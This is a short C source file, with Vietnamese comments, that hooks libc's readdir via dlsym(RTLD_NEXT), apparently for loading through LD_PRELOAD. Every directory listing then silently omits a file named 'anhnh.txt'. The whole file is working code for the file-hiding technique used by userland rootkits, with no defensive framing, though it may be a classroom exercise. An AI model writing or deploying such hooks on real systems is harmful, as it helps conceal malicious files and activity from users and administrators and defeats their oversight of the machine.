#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <dirent.h>

struct dirent *(*real_readdir)(DIR *dir);
struct dirent *readdir(DIR *dirp)
{
	if (!real_readdir)
		real_readdir = dlsym(RTLD_NEXT, "readdir");
		//real_readdir la readdir cua libc 
	struct dirent *dir = real_readdir(dirp);

	if((dir != NULL) && !strcmp(dir->d_name, "anhnh.txt"))	
		dir = real_readdir(dirp);
		//neu readdir van khac NULL ma co d_name la anhnh.txt thi goi den real_readdir de bo qua file nay 

	return dir;
}
